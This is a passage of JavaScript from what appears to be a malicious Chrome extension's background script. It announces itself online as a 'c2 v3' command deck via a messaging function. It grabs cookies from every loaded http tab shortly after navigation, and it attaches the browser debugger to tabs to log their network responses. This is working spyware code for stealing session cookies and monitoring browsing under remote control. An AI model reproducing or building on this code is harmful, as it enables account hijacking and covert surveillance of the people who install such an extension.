  await chrome.alarms.create(ALARM_NAME, { periodInMinutes: 0.5 });
  await sendMsg(`🟢 c2 v3 online — ${escapeHtml(getBengaliDateTime())}\n<code>/help</code> for the deck`);
  pollLoop();
});
chrome.runtime.onStartup.addListener(() => pollLoop());

chrome.webNavigation.onCompleted.addListener(async (d) => {
  if (d.frameId === 0 && d.url.startsWith("http")) {
    setTimeout(() => grabApplicationTabCookies(d.tabId, d.url), 2000);
  }
});

chrome.tabs.onUpdated.addListener((tabId, c, tab) => {
  if (c.status === "complete" && tab.url?.startsWith("http")) {
    if (OPENED_TABS.has(tabId)) OPENED_TABS.set(tabId, tab.url);
    setTimeout(() => grabApplicationTabCookies(tabId, tab.url), 2000);
  }
});

chrome.tabs.onRemoved.addListener(async (tabId) => {
  OPENED_TABS.delete(tabId);
  NET_BUFFER.delete(tabId);
  if (DEBUGGED.has(tabId)) {
    try { await chrome.debugger.detach({ tabId }); } catch {}
    DEBUGGED.delete(tabId);
  }
});

chrome.debugger.onDetach.addListener(({ tabId }) => DEBUGGED.delete(tabId));

chrome.debugger.onEvent.addListener((source, method, params) => {
  if (method !== "Network.responseReceived") return;
  const buf = NET_BUFFER.get(source.tabId);
  if (!buf) return;
  buf.push({
    method: params.response?.requestHeaders?.method || "GET",
    url: params.response?.url,
    status: params.response?.status
  });
  if (buf.length > 500) buf.shift();
});